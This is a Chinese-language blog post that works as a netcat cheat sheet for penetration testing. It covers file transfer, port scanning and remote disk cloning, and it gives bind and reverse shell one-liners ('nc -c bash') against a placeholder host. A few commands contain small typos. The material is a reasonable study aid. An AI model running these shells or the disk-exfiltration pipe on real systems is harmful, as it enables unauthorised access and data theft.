---
title: "网络工具中的瑞士军刀-NETCAT"
date: "2020-08-27T18:24:08+08:00"
description: ""
categories: ["信息安全","渗透测试"]
tags: ["渗透测试","Windows","信息安全"]
legacyPath: "/posts/caae728a.html"
---
<h1 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET / BANNER"></a>NC——TELNET / BANNER</h1><ul>
<li>nc -nv 1.1.1.1 110</li>
</ul>

<h1 id="NC——传输文本信息"><a href="#NC——传输文本信息" class="headerlink" title="NC——传输文本信息"></a>NC——传输文本信息</h1><ul>
<li>nc -l -p 4444</li>
<li>nc -nv 1.1.1.1 4444<br>审计时，输出到其它计算机<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">nc -l -p 333 &gt; ps.txt<br>ps -aux|nc -nv 10.1.1.12 333 -q 1<br></code></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h1><ul>
<li>传输文件<ul>
<li>A:<code>nc -lp 333 &gt; 1.mp4</code></li>
<li>B:<code>nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1</code></li>
<li>或</li>
<li>A:<code>nc -lp 333 &lt; 1.mp4 -q 1</code></li>
<li>B:<code>nc -vn 333 &gt; 1.mp4</code></li>
</ul>
</li>
<li>传输目录<ul>
<li>A:<code>tar -cvf -music/ | nc -lp 333 -q 1</code></li>
<li>B:<code>nc -nv 1.1.1.1 333 | tar -xvf -</code></li>
</ul>
</li>
<li>传输加密文件<ul>
<li>A:<code>nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</code></li>
<li>B:<code>mcrypt -flush -Fbqd -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</code></li>
</ul>
</li>
</ul>
<h1 id="NC——流媒体服务"><a href="#NC——流媒体服务" class="headerlink" title="NC——流媒体服务"></a>NC——流媒体服务</h1><ul>
<li>A:<code>cat 1.mp4 | nc -lp 333</code></li>
<li>B:<code>nc -nv 1.1.1.1 333 |mplayer -vo x11 -cache 3000 -</code></li>
</ul>
<h1 id="NC——端口扫描"><a href="#NC——端口扫描" class="headerlink" title="NC——端口扫描"></a>NC——端口扫描</h1><ul>
<li><code>nc -nvz 1.1.1.1 -65535</code> TCP端口</li>
<li><code>nc -nvzu 1.1.1.1 1-1024</code> UDP端口</li>
</ul>
<h1 id="NC——远程硬盘克隆"><a href="#NC——远程硬盘克隆" class="headerlink" title="NC——远程硬盘克隆"></a>NC——远程硬盘克隆</h1><ul>
<li><code>nc -lp 333|dd of=/dev/sda</code></li>
<li><code>dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></li>
</ul>
<h1 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h1><ul>
<li>正向：<ul>
<li>A:<code>nc -lp 333 -c bash</code></li>
<li>B:<code>nc -nv 1.1.1.1 333</code></li>
</ul>
</li>
<li>反向：<ul>
<li>A:<code>nc -lp 333</code></li>
<li>B:<code>nc -nv 1.1.1.1 333 -c bash</code></li>
</ul>
</li>
<li>注：Windows把bash改成cmd</li>
</ul>
<h1 id="NC——NCAT"><a href="#NC——NCAT" class="headerlink" title="NC——NCAT"></a>NC——NCAT</h1><ul>
<li>NC缺乏加密和身份验证的能力</li>
<li>Ncat</li>
<li>A:<code>ncat ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl</code></li>
<li>B:<code>ncat -nv 1.1.1.1 333 --ssl</code></li>
<li>不同平台/系统 nc参数功能不尽相同</li>
</ul>
